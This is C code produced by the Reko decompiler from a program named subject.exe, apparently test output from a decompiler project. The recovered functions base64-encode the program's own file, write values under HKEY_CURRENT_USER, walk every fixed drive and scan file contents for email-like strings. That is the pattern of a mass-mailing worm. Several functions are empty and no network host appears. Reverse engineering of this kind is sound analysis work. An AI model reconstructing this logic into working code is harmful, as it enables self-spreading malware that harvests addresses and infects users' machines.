// subject.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

// 00401000: void fn00401000(Stack (ptr Eq_2) dwArg04, Stack uint32 dwArg08)
void fn00401000(Eq_2 * dwArg04, uint32 dwArg08)
{
	union Eq_2 * edi_11 = dwArg04;
	uint32 ecx_14 = dwArg08 >> 0x02;
	if (dwArg08 >> 0x02 != 0x00)
	{
		while (ecx_14 != 0x00)
		{
			*edi_11 = 0x00;
			edi_11 = (union Eq_2 *) ((char *) edi_11 + 0x04);
			ecx_14 = ecx_14 - 0x01;
		}
	}
	ui32 ecx_21 = dwArg08 & 0x03;
	if ((dwArg08 & 0x03) != 0x00)
	{
		while (ecx_21 != 0x00)
		{
			*edi_11 = (union Eq_2 *) 0x00;
			edi_11 = (union Eq_2 *) ((char *) edi_11 + 0x01);
			ecx_21 = ecx_21 - 0x01;
		}
	}
}

// 004010DD: Register ui32 fn004010DD(Register word32 edx, Stack (ptr Eq_39) dwArg04, Stack Eq_40 dwArg08, Stack Eq_41 dwArg0C)
ui32 fn004010DD(word32 edx, Eq_39 * dwArg04, Eq_40 dwArg08, Eq_41 dwArg0C)
{
	word32 dwLoc08_100 = 0x00;
	struct Eq_39 * esi_145 = dwArg04;
	Eq_40 edi_104 = dwArg08;
	Eq_41 ecx_107 = dwArg0C;
	uint32 eax_103 = 0x00;
	do
	{
		byte al_137;
		uint32 eax_136;
		ui32 ebx_141 = 0x00;
		uint32 eax_47 = DPB(eax_103, esi_145->b0000, 0);
		esi_145 = &esi_145->b0001;
		Eq_41 ecx_150 = ecx_107 - 0x01;
		if (ecx_150 == 0x00)
		{
			eax_136 = eax_47 << 0x10;
			al_137 = (byte) (eax_47 << 0x10);
			ebx_141 = 0x02;
		}
		else
		{
			ui32 eax_144 = DPB(eax_47 << 0x08, esi_145->b0000, 0);
			esi_145 = &esi_145->b0001;
			eax_136 = eax_144 << 0x08;
			al_137 = (byte) (eax_144 << 0x08);
			ecx_150 = ecx_150 - 0x01;
			if (ecx_150 == 0x01)
				ebx_141 = 0x01;
			else
			{
				al_137 = esi_145->b0001;
				eax_136 = DPB(eax_144 << 0x08, al_137, 0);
				esi_145 = esi_145 + 0x01;
				ecx_150 = ecx_150 - 0x02;
			}
		}
		word32 ecx_66 = 0x04;
		do
		{
			Eq_87 dl_77 = al_137 & 0x3F;
			eax_136 = eax_136 >> 0x06;
			edx = DPB(__rol(edx, 0x08), dl_77, 0);
			al_137 = (byte) eax_136;
			ecx_66 = ecx_66 - 0x01;
		} while (ecx_66 != 0x00);
		word32 edx_86 = fn00401159(0x04, dl_77);
		*edi_104 = edx_86;
		word32 v18_96 = dwLoc08_100 + 0x01;
		edi_104 = (word32) edi_104 + 0x04;
		edx = edx_86;
		dwLoc08_100 = v18_96;
		if (v18_96 == 0x12)
		{
			*edi_104 = 0x0A0D;
			dwLoc08_100 = 0x00;
			edi_104 = (word32) edi_104 + 0x02;
		}
		eax_103 = eax_136;
		ecx_107 = ecx_150;
	} while (ecx_150 != 0x00);
	ui32 ecx_111 = ebx_141;
	byte * edi_112 = edi_104 - ebx_141;
	while (ecx_111 != 0x00)
	{
		*edi_112 = 0x3D;
		edi_112 = edi_112 + 0x01;
		ecx_111 = ecx_111 - 0x01;
	}
	return ecx_111;
}

// 00401159: Register word32 fn00401159(Register word32 ecx, Register Eq_87 dl)
word32 fn00401159(word32 ecx, Eq_87 dl)
{
	do
	{
		word32 edx_14;
		if (dl < 0x3E)
		{
			if (dl <= 0x33)
			{
				Eq_170 dl_22 = (word32) dl + 0x0041;
				edx_14 = DPB(edx, dl_22, 0);
				if (dl_22 > 0x5A)
					edx_14 = DPB(edx, (word32) dl_22 + 0x06, 0);
			}
			else
				edx_14 = DPB(edx, (word32) dl + 252, 0);
		}
		else
			edx_14 = DPB(edx, (dl - 0x3E << 0x02) + 0x2B, 0);
		edx = __rol(edx_14, 0x08);
		dl = (byte) edx;
		ecx = ecx - 0x01;
	} while (ecx != 0x00);
	return edx;
}

// 0040126F: void fn0040126F(Stack Eq_41 dwArg04)
void fn0040126F(Eq_41 dwArg04)
{
	globals->t405814 = dwArg04;
	globals->dw4056C5 = 0x01;
	word32 * edi_17 = &globals->t405814;
	Eq_41 eax_11 = dwArg04;
	do
	{
		edi_17 = edi_17 + 0x01;
		eax_11 = (word32) (globals->dw4056C9 * eax_11);
		*edi_17 = (word32) eax_11;
		globals->dw4056C5 = globals->dw4056C5 + 0x01;
	} while (globals->dw4056C5 != 0x0270);
}

// 004012AA: Register uint32 fn004012AA(Stack ui32 dwArg04, Register out ptr32 ecxOut)
uint32 fn004012AA(ui32 dwArg04, ptr32 & ecxOut)
{
	*ecxOut = ecx;
	if (globals->dw4056C5 >= 0x0270)
	{
		if (globals->dw4056C5 == 0x0271)
			fn0040126F(0x1105);
		word32 dwLoc08_103 = 0x00;
		struct Eq_265 * esi_101 = &globals->t405814;
		do
		{
			uint32 eax_83 = esi_101->dw0000 & 0x80000000 | esi_101[0x01] & 0x7FFFFFFF;
			ui32 eax_160 = eax_83 >> 0x01 ^ esi_101[0x018D];
			if ((eax_83 & 0x01) != 0x00)
				eax_160 = eax_160 ^ 0x9908B0DF;
			esi_101->dw0000 = eax_160;
			word32 v17_102 = dwLoc08_103 + 0x01;
			esi_101 = esi_101 + 0x01;
			dwLoc08_103 = v17_102;
		} while (v17_102 != 227);
		do
		{
			uint32 eax_113 = esi_101->dw0000 & 0x80000000 | esi_101[0x01] & 0x7FFFFFFF;
			ui32 eax_119 = eax_113 >> 0x01 ^ esi_101->dwFFFFFC74;
			if ((eax_113 & 0x01) != 0x00)
				eax_119 = eax_119 ^ 0x9908B0DF;
			esi_101->dw0000 = eax_119;
			word32 v18_132 = dwLoc08_103 + 0x01;
			esi_101 = esi_101 + 0x01;
			dwLoc08_103 = v18_132;
		} while (v18_132 != 0x026F);
		ui32 ecx_141 = eax_113 & 0x01 & 0x01;
		ui32 eax_139 = eax_119 ^ globals->dw405E44;
		word32 ecx_142;
		*ecxOut = ecx_141;
		if (ecx_141 != 0x00)
			eax_139 = eax_139 ^ 0x9908B0DF;
		esi_101->dw0000 = eax_139;
		globals->dw4056C5 = 0x00;
	}
	uint32 eax_32 = globals->dw4056C5;
	globals->dw4056C5 = globals->dw4056C5 + 0x01;
	uint32 eax_37 = (&globals->t405814)[eax_32];
	ui32 ebx_40 = eax_37 ^ eax_37 >> 11;
	ui32 ebx_44 = ebx_40 ^ ebx_40 << 0x07 & 2636928640;
	uint32 ebx_48 = ebx_44 ^ ebx_44 << 0x0F & 0xEFC60000;
	return (uint32) ((uint64) (uint32) (ebx_48 >> 0x12 ^ ebx_48) % dwArg04);
}

// 00401524: void fn00401524(Stack (ptr Eq_40) dwArg04, Stack ui32 dwArg08)
void fn00401524(Eq_40 * dwArg04, ui32 dwArg08)
{
	*dwArg04 = (union Eq_40 *) GlobalAlloc(0x40, dwArg08 << 0x02);
}

// 004015A5: void fn004015A5()
void fn004015A5()
{
	RegCreateKeyA((struct HKEY__ *) 0x80000001, 0x004056EF, fp - 0x08);
	ptr32 esp_101 = fp + ~0x3B;
	if (RegQueryValueExA(dwLoc08, 0x00405702, null, fp - 0x0C, globals->a4056CD, fp - 0x10) != 0x00)
	{
		byte * edi_73 = globals->a4056CD;
		word32 esi_74 = 0x09;
		do
		{
			word32 ecx_79;
			*edi_73 = (byte) (fn004012AA(0x09, out ecx_79) + 0x31);
			edi_73 = edi_73 + 0x01;
			esi_74 = esi_74 - 0x01;
		} while (esi_74 != 0x00);
		RegSetValueExA(dwLoc08, 0x00405702, 0x00, 0x01, globals->a4056CD, 0x08);
		esp_101 = fp + ~0x53;
	}
	HKEY * esp_64 = esp_101 - 0x04;
	*esp_64 = (HKEY *) dwLoc08;
	RegCloseKey(*esp_64);
}

// 00401625: Register Eq_384 fn00401625()
LSTATUS fn00401625()
{
	RegCreateKeyA((struct HKEY__ *) 0x80000001, 0x00405706, fp - 0x08);
	RegSetValueExA(dwLoc08, 0x00405734, 0x00, 0x01, &globals->t407F20, lstrlenA(4226848));
	return RegCloseKey(dwLoc08);
}

// 00401669: Register word32 fn00401669()
word32 fn00401669()
{
	word32 eax_43;
	GetLocalTime(fp - 0x14);
	fn00401000(fp - 0x24, 0x10);
	SystemTimeToFileTime(fp - 0x14, fp - 44);
	SystemTimeToFileTime(fp - 0x24, fp - 0x34);
	if (CompareFileTime(fp - 44, fp - 0x34) == 0x01)
		eax_43 = 0x00;
	else
		eax_43 = 0x01;
	return eax_43;
}

// 004016CA: Register word32 fn004016CA()
word32 fn004016CA()
{
	Eq_40 eax_12 = GlobalAlloc(0x40, 0x2000);
	GetModuleFileNameA(null, eax_12, 0x1FFF);
	HANDLE * esp_137 = fp + ~0x3F;
	Eq_541 eax_37 = CreateFileA(eax_12, 0x80000000, 0x01, null, 0x03, 0x00, null);
	if (eax_37 != (void *) 0x01)
	{
		HANDLE * esp_104 = fp + ~0x47;
		Eq_41 eax_106 = GetFileSize(eax_37, null);
		if (eax_106 != 0x01)
		{
			esp_104 = fp + ~0x5F;
			Eq_541 eax_153 = CreateFileMappingA(eax_37, null, 0x02, 0x00, 0x00, 0x00);
			if (eax_153 != null)
			{
				ptr32 esp_167 = fp + ~0x73;
				if (MapViewOfFile(eax_153, 0x04, 0x00, 0x00, 0x00) != 0x00)
				{
					globals->t407F14 = GlobalAlloc(0x40, eax_106 << 0x02);
					ecx = fn004010DD(0x40, (struct Eq_39 *) 0x40, globals->t407F14, eax_106);
					Eq_40 v17_212 = globals->t407F14;
					globals->t407F18 = lstrlenA(v17_212);
					UnmapViewOfFile(v17_212);
					esp_167 = fp + ~0x83;
				}
				esp_104 = esp_167 - 0x04;
				*esp_104 = (HANDLE *) eax_153;
				CloseHandle(*esp_104);
			}
		}
		esp_137 = esp_104 - 0x04;
		*esp_137 = (HANDLE *) eax_37;
		CloseHandle(*esp_137);
	}
	union Eq_40 * esp_95 = esp_137 - 0x04;
	*esp_95 = (union Eq_40 *) eax_12;
	GlobalFree(*esp_95);
	return ecx;
}

// 0040179B: void fn0040179B()
void fn0040179B()
{
	RegCreateKeyA((struct HKEY__ *) 0x80000001, 0x004056EF, fp - 0x08);
	RegSetValueExA(dwLoc08, 0x0040574F, 0x00, 0x04, fp - 0x0C, 0x04);
	RegCloseKey(dwLoc08);
}

// 004017DC: Register word32 fn004017DC()
word32 fn004017DC()
{
	word32 ebx_41;
	RegCreateKeyA((struct HKEY__ *) 0x80000001, 0x004056EF, fp - 0x08);
	if (RegQueryValueExA(dwLoc08, 0x0040574F, null, fp - 0x0C, fp - 0x14, fp - 0x10) != 0x00)
		ebx_41 = 0x01;
	else
		ebx_41 = 0x00;
	RegCloseKey(dwLoc08);
	return ebx_41;
}

// 00401835: Register word32 fn00401835()
word32 fn00401835()
{
}

// 00401C78: void fn00401C78(Stack word32 dwArg04, Stack word32 dwArg08, Stack word32 dwArg0C)
void fn00401C78(word32 dwArg04, word32 dwArg08, word32 dwArg0C)
{
	Eq_40 eax_12 = GlobalAlloc(0x00, 0x0C);
	*eax_12 = dwArg04;
	*((word32) eax_12 + 0x04) = dwArg08;
	*((word32) eax_12 + 0x08) = dwArg0C;
	CloseHandle(CreateThread(null, 0x00, &globals->t401BA7, eax_12, 0x00, fp - 0x0C));
}

// 00402737: void fn00402737()
void fn00402737()
{
	globals->t408146 = CreateMutexA(null, 0x00, 0x00);
	globals->dw40812A = 0x00;
	globals->dw40812E = 0x00;
	ptr32 esp_12 = fp - 0x14;
	word32 ebx_18 = 0x05;
	word32 * edi_19 = globals->a408132;
	do
	{
		SIZE_T * esp_23 = esp_12 - 0x04;
		*esp_23 = (uint32) 0x0C;
		*(esp_23 - 0x04) = 0x40;
		*edi_19 = (word32) GlobalAlloc(*(esp_23 - 0x04), *esp_23);
		esp_12 = esp_23 - 0x04;
		edi_19 = edi_19 + 0x01;
		ebx_18 = ebx_18 - 0x01;
	} while (ebx_18 != 0x00);
}

// 004028A5: Register Eq_40 fn004028A5(Register Eq_40 esi, Stack Eq_40 dwArg04)
Eq_40 fn004028A5(Eq_40 esi, Eq_40 dwArg04)
{
}

// 004028F3: Register Eq_40 fn004028F3(Register Eq_40 esi, Stack Eq_40 dwArg04)
Eq_40 fn004028F3(Eq_40 esi, Eq_40 dwArg04)
{
}

// 0040293D: Register word32 fn0040293D(Stack Eq_40 dwArg04, Stack Eq_40 dwArg08)
word32 fn0040293D(Eq_40 dwArg04, Eq_40 dwArg08)
{
	if (dwArg08 - dwArg04 < 0x02)
		return 0x00;
	return 0x01;
}

// 0040295A: void fn0040295A(Register word32 eax, Stack Eq_40 dwArg04)
void fn0040295A(word32 eax, Eq_40 dwArg04)
{
	ptr32 esp_14;
	word32 ebp_15;
	word32 eax_16;
	byte SZO_17;
	byte C_18;
	byte Z_19;
	byte SCZO_20;
	byte CZ_21;
	shlwapi.dll!StrRChrA();
	if (eax_16 != 0x00)
		*(esp_14 - 0x04) = eax_16;
}

// 00402985: Register up32 fn00402985(Register ptr32 ebp, Stack Eq_40 dwArg04, Stack Eq_41 dwArg08, Stack Eq_40 dwArg0C)
up32 fn00402985(ptr32 ebp, Eq_40 dwArg04, Eq_41 dwArg08, Eq_40 dwArg0C)
{
	word32 dwLoc10_16 = 0x00;
	Eq_40 esi_112 = dwArg04;
	word32 * esp_113 = fp + ~0x020F;
	word32 v9_26 = dwArg08 + dwArg04;
	while (esi_112 < v9_26)
	{
		word32 v11_53 = dwLoc10_16 + 0x01;
		dwLoc10_16 = v11_53;
		if (v11_53 == 10000)
		{
			esp_113 = esp_113 - 0x04;
			*esp_113 = 0x01;
			Sleep(*esp_113);
			dwLoc10_16 = 0x00;
		}
		esi_112 = (word32) esi_112 + 0x01;
		if (*esi_112 == 0x40)
		{
			word32 * esp_80 = esp_113 - 0x04;
			*esp_80 = (word32) esi_112;
			*(esp_80 - 0x04) = (union Eq_40 *) dwArg04;
			byte * eax_86 = fn004028A5(esi_112, dwArg00);
			*(esp_80 - 0x04) = (union Eq_40 *) v9_26;
			word32 * esp_111 = esp_80;
			ecx = fn004028F3(esi_112, dwArg00) - eax_86;
			if (ecx < 500 && ecx > 0x05)
			{
				byte * esi_117 = eax_86;
				byte * edi_118 = fp - 0x0204;
				byte * edx_119 = null;
				do
				{
					byte al_128 = *esi_117;
					esi_117 = esi_117 + 0x01;
					if (al_128 != 0x00)
					{
						*edi_118 = al_128;
						edi_118 = edi_118 + 0x01;
						if (al_128 == 0x40)
							edx_119 = edi_118;
					}
					ecx = ecx - 0x01;
				} while (ecx != 0x00);
				*edi_118 = 0x00;
				ptr32 edi_142 = edi_118 + 0x01;
				if (edx_119 != null)
				{
					*(esp_80 - 0x04) = (byte **) edx_119;
					*(esp_80 - 0x08) = fp - 0x0204;
					Eq_41 eax_152 = lstrlenA(*(esp_80 - 0x08));
					word32 edx_153 = *(esp_80 - 0x08);
					esp_111 = esp_80 - 0x04;
					if (eax_152 > 0x05)
					{
						*(esp_80 - 0x08) = edx_153;
						*(esp_80 - 0x0C) = fp - 0x0204;
						word32 eax_162 = fn0040293D(dwArg00, dwArg04);
						*(esp_80 - 0x08) = edi_142;
						*(esp_80 - 0x0C) = edx_153;
						fn0040295A(eax_162, dwArg00);
						esp_111 = esp_80 - 0x04;
						if (eax_162 != 0x00)
						{
							*(esp_80 - 0x08) = fp - 0x0204;
							word32 ebp_180;
							byte SCZO_181;
							word32 esi_182;
							word32 edi_183;
							word32 ebx_184;
							byte C_185;
							byte SZO_186;
							byte Z_187;
							byte D_188;
							byte al_189;
							word32 eax_190;
							byte CZ_192;
							word32 edx_193;
							dwArg0C();
						}
					}
				}
			}
			esi_112 = *esp_111;
			esp_113 = esp_111 + 0x01;
		}
	}
	return ecx;
}

// 00402A5A: Register word32 fn00402A5A(Stack Eq_40 dwArg04, Stack Eq_40 dwArg08, Register out ptr32 esiOut)
word32 fn00402A5A(Eq_40 dwArg04, Eq_40 dwArg08, ptr32 & esiOut)
{
	*esiOut = esi;
	Eq_541 eax_27 = CreateFileA(dwArg04, 0x80000000, 0x01, null, 0x03, 0x00, null);
	if (eax_27 != (void *) 0x01)
	{
		HANDLE * esp_113 = fp + ~0x33;
		Eq_41 eax_88 = GetFileSize(eax_27, null);
		if (eax_88 != 0x01)
		{
			esp_113 = fp + ~0x4B;
			Eq_541 eax_131 = CreateFileMappingA(eax_27, null, 0x02, 0x00, 0x00, 0x00);
			if (eax_131 != null)
			{
				ptr32 esp_145 = fp + ~0x5F;
				Eq_40 eax_147 = MapViewOfFile(eax_131, 0x04, 0x00, 0x00, 0x00);
				if (eax_147 != 0x00)
				{
					ecx = fn00402985(fp - 0x04, eax_147, eax_88, dwArg08);
					UnmapViewOfFile(eax_147);
					esp_145 = fp + ~0x63;
				}
				esp_113 = esp_145 - 0x04;
				*esp_113 = (HANDLE *) eax_131;
				CloseHandle(*esp_113);
			}
		}
		HANDLE * esp_115 = esp_113 - 0x04;
		*esp_115 = (HANDLE *) eax_27;
		CloseHandle(*esp_115);
	}
	return ecx;
}

// 00402ADD: void fn00402ADD()
void fn00402ADD()
{
	fn00401524(&globals->t40814A, 5000);
	globals->b40814E = 0x00;
}

// 00402B8F: Register ui32 fn00402B8F(Register ui32 ecx, Register ptr32 ebp, Stack Eq_40 dwArg04, Register out ptr32 esiOut, Register out Eq_1456 ediOut)
ui32 fn00402B8F(ui32 ecx, ptr32 ebp, Eq_40 dwArg04, ptr32 & esiOut, Eq_1456 & ediOut)
{
}

// 00402BCB: Register ui32 fn00402BCB(Register ui32 ecx, Register ptr32 ebp, Stack Eq_40 dwArg04, Stack Eq_40 dwArg08, Register out ptr32 esiOut, Register out Eq_1542 ediOut)
ui32 fn00402BCB(ui32 ecx, ptr32 ebp, Eq_40 dwArg04, Eq_40 dwArg08, ptr32 & esiOut, Eq_1542 & ediOut)
{
	*esiOut = esi;
	Eq_1545 eax_15 = LocalAlloc(0x00, 0x0400);
	Eq_1545 eax_21 = LocalAlloc(0x00, 0x013E);
	Eq_41 edi_134 = lstrlenA(dwArg04);
	lstrcatA(dwArg04, 0x004057E7);
	ptr32 esp_103 = fp + ~0x37;
	Eq_541 eax_41 = FindFirstFileA(dwArg04, eax_21);
	if (eax_41 != (void *) 0x01)
	{
		do
		{
			Mem79[edi_134 + dwArg04:byte] = 0x00;
			if (*((word32) eax_21 + 44) != 0x2E && *((word32) eax_21 + (void *) 44) != 0x2E2E)
			{
				union Eq_40 * esp_108 = esp_103 - 0x04;
				*esp_108 = (word32) eax_21 + (void *) 44;
				*(esp_108 - 0x04) = (union Eq_40 *) dwArg04;
				lstrcatA(*(esp_108 - 0x04), *esp_108);
				if ((*eax_21 & 0x10) != 0x00)
				{
					*(esp_108 - 0x08) = 0x004057E5;
					*(esp_108 - 0x0C) = (union Eq_40 *) dwArg04;
					lstrcatA(*(esp_108 - 0x0C), *(esp_108 - 0x08));
					*(esp_108 - 0x10) = (union Eq_40 *) dwArg08;
					*(esp_108 - 0x14) = (union Eq_40 *) dwArg04;
					esp_103 = esp_108 - 0x14;
					word32 esi_133;
					ecx = fn00402BCB(ecx, fp - 0x04, dwArg00, dwArg04, out esi_133, out edi_134);
				}
				else
				{
					*(esp_108 - 0x08) = (union Eq_40 *) dwArg04;
					word32 esi_139;
					ecx = fn00402B8F(ecx, fp - 0x04, dwArg00, out esi_139, out edi_134);
					esp_103 = esp_108 - 0x04;
				}
			}
			union Eq_41 * esp_90 = esp_103 - 0x04;
			*esp_90 = 0x01;
			Sleep(*esp_90);
			*(esp_90 - 0x04) = (union Eq_1545 *) eax_21;
			*(esp_90 - 0x08) = (HANDLE *) eax_41;
			esp_103 = esp_90 - 0x08;
		} while (FindNextFileA(*(esp_90 - 0x08), *(esp_90 - 0x04)) != 0x00);
		*(esp_90 - 0x0C) = (HANDLE *) eax_41;
		FindClose(*(esp_90 - 0x0C));
		esp_103 = esp_90 - 0x0C;
	}
	union Eq_1545 * esp_59 = esp_103 - 0x04;
	*esp_59 = (union Eq_1545 *) eax_15;
	LocalFree(*esp_59);
	*(esp_59 - 0x04) = (union Eq_1545 *) eax_21;
	LocalFree(*(esp_59 - 0x04));
	word32 edi_66;
	*ediOut = *(esp_59 - 0x04);
	return ecx;
}

// 00402C9D: Register ui32 fn00402C9D(Register ui32 ecx, Stack Eq_40 dwArg04, Register out Eq_1757 esiOut)
ui32 fn00402C9D(ui32 ecx, Eq_40 dwArg04, Eq_1757 & esiOut)
{
	Eq_40 eax_12 = GlobalAlloc(0x40, 0x00010000);
	Eq_40 eax_20 = lstrcpyA(eax_12, dwArg04);
	word32 esi_26;
	word32 edi_27;
	ui32 ecx_28 = fn00402BCB(ecx, fp - 0x04, eax_20, eax_20, out esi_26, out edi_27);
	GlobalFree(eax_12);
	return ecx_28;
}

// 00402CCE: void fn00402CCE(Register ui32 ecx, Register word32 ebp)
void fn00402CCE(ui32 ecx, word32 ebp)
{
	Eq_40 eax_18 = GlobalAlloc(0x40, 0x2000);
	GetLogicalDriveStringsA(0x1FFF, eax_18);
	ptr32 esp_23 = fp + ~0x1F;
	Eq_40 esi_26 = eax_18;
	while (*esi_26 != 0x00)
	{
		union Eq_40 * esp_37 = esp_23 - 0x04;
		*esp_37 = (union Eq_40 *) esi_26;
		if (GetDriveTypeA(*esp_37) == 0x03)
		{
			*(esp_37 - 0x04) = (union Eq_40 *) esi_26;
			ecx = fn00402C9D(ecx, dwArg00, out esi_26);
		}
		*(esp_37 - 0x04) = (union Eq_40 *) esi_26;
		esp_23 = esp_37 - 0x04;
		esi_26 = esi_26 + lstrlenA(*(esp_37 - 0x04)) + 0x01;
	}
	union Eq_40 * esp_59 = esp_23 - 0x04;
	*esp_59 = (union Eq_40 *) eax_18;
	GlobalFree(*esp_59);
}

// 00402E07: void fn00402E07()
void fn00402E07()
{
	CloseHandle(CreateThread(null, 0x00, &globals->t402DED, 0x00, 0x00, fp - 0x08));
}

// 0040318A: Register Eq_41 Win32CrtStartup()
Eq_41 Win32CrtStartup()
{
	CoInitialize(0x00);
	ui32 ecx_27 = fn00401835();
	if (globals->dw405003 == 0x00)
		globals->dw405003 = fn004012AA(45000, out ecx_27) + 5000;
	fn00401C78(globals->dw405003, 0x004030F6, 4216668);
	fn00402E07();
	word32 * esp_18 = fp - 0x04;
	if (globals->dw405754 != 0x00)
		fn00402CCE(ecx_27, ebp);
	while (true)
	{
		esp_18 = esp_18 - 0x04;
		*esp_18 = 1000;
		Sleep(*esp_18);
	}
}

